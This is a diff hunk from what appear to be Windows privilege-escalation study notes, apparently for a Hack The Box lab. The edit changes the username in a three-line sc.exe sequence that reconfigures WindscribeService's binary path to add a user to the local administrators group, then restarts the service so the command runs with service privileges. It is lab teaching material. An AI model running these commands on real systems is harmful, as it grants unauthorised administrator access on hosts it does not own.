@@ -81,7 +81,7 @@ Flags: `-q` no banner, `-u` suppress errors, `-v` verbose, `-c` a service name, 
 Rewrite the binary path to any command, then cycle the service. The command runs as the service account even though the "service" fails to start (the binary isn't a real service - Windows runs it, it errors, the side effect already happened):
 
 ```
-sc config WindscribeService binpath= "cmd /c net localgroup administrators htb-student /add"
+sc config WindscribeService binpath= "cmd /c net localgroup administrators student /add"
 sc stop WindscribeService
 sc start WindscribeService          # returns error 1053 - the net command still ran
 ```
